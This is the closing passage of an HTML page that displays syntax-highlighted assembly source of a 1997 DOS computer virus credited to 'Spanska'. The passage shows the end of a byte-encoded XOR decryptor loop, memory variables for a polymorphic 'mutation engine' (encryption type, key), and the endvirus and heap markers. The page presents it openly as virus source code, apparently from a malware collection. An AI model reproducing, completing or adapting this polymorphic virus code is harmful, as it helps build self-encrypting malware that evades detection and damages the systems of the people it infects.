</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">;test bl, 01000000b</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D2h</span><span class="sc0">            </span><span class="sc1">;je xor_loop</span><span class="sc0">

</span><span class="sc1">;-----------memory zones used by mutation engine---------------</span><span class="sc0">

</span><span class="sc5">temp</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">type_cryptage</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">fin_cryptage</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">clef</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">endvirus</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">heap</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">
    </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">

</span><span class="sc1">;----------------- (c) Spanska 1997 ---------------------------</span><span class="sc0">
</span></div></body>
</html>
